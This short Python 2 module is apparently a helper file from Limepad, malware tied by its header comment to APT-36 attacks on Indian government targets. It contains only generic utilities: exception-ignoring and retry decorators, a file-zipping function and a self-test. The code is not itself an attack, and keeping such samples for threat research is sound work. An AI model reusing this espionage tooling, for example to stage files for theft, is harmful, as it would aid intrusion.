# module used by Limepad
# reference blog: https://www.zscaler.com/blogs/security-research/new-and-improved-ttps-apt-36-targeting-indian-governmental-organizations
import os, sys
from time import sleep
import random, subprocess, zipfile
from controls import ROOTDATA
import _winreg, logging
billet = logging.getLogger('Limepad')

def ignore_exception(IgnoreException=Exception, DefaultVal=None):

    def dec(function):

        def _dec(*args, **kwargs):
            try:
                return function(*args, **kwargs)
            except IgnoreException:
                return DefaultVal

        return _dec

    return dec


def tryagain(func, retries=3, delay=3, IgnoreException=Exception):

    def dec(*args, **kwargs):
        for i in range(retries - 1):
            try:
                return func(*args, **kwargs)
            except IgnoreException:
                sleep(delay)

        func(*args, **kwargs)

    return dec


def attempt_retries_decorator(retries=3, delay=3, ignore_exception=Exception):

    def dec(function):
        return tryagain(function, retries, delay, ignore_exception)

    return dec


def filezip(fname):
    if not os.path.exists(fname):
        os.stat(fname)
    zfname = fname + '.zip'
    z = zipfile.ZipFile(zfname, 'w', zipfile.ZIP_DEFLATED)
    z.write(fname)
    z.close()
    return zfname


if __name__ == '__main__':

    class Test:

        def __init__(self):
            self.c = 0

        @ignore_exception(Exception, 1000)
        def helloworld(self):
            self.c += 1
            if self.c % 3 == 0:
                print 'Hello World'
            else:
                raise Exception('Counter Exception')


    t = Test()
    t.helloworld()
